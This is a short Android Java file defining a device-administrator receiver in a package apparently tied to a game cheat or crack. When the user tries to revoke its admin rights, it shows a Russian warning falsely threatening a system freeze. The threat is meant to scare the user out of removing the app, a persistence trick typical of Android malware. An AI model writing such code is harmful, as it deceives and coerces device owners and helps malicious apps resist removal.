package com.elysium.crack;

import android.app.admin.DeviceAdminReceiver;
import android.content.Context;
import android.content.Intent;

public class AdminReceiver extends DeviceAdminReceiver {
    @Override
    public CharSequence onDisableRequested(Context context, Intent intent) {
        return "ВНИМАНИЕ! Инжект чита заблокирован. Попытка отключения приведет к зависанию системы!";
    }
}